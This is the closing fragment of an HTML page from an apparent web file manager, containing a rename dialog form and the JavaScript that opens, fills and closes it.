<div class="rename-popup" id="gobel-rename-modal">
    <div class="rename-box">
        <h4 id="gobel-rename-title">Rename</h4>
        <form method="post" id="gobel-rename-form">
            <input type="hidden" name="renameTarget" id="gobel-rename-target">
            <input type="text" name="renameTo" id="gobel-rename-input" required autocomplete="off">
            <div class="rename-box-actions" style="margin-top:4px;">
                <button type="button" class="btn btn-ghost btn-sm" onclick="closeRename()">Cancel</button>
                <button type="submit" name="doRename" class="btn btn-gold btn-sm">Rename</button>
            </div>
        </form>
    </div>
</div>

<script>
/* ── Rename modal ── */
document.addEventListener('click', function(e) {
    var btn = e.target.closest('.gobel-rename-btn');
    if (!btn) return;
    var filePath = btn.getAttribute('data-path');
    var fileName = btn.getAttribute('data-name');
    document.getElementById('gobel-rename-target').value       = filePath;
    document.getElementById('gobel-rename-input').value        = fileName;
    document.getElementById('gobel-rename-title').textContent  = 'Rename \u2014 ' + fileName;
    var modal = document.getElementById('gobel-rename-modal');
    modal.classList.add('open');
    var inp = document.getElementById('gobel-rename-input');
    inp.focus();
    inp.select();
});

function closeRename() {
    document.getElementById('gobel-rename-modal').classList.remove('open');
}

document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape') closeRename();
});

document.getElementById('gobel-rename-modal').addEventListener('click', function(e) {
    if (e.target === this) closeRename();
});
</script>
</body>
</html>
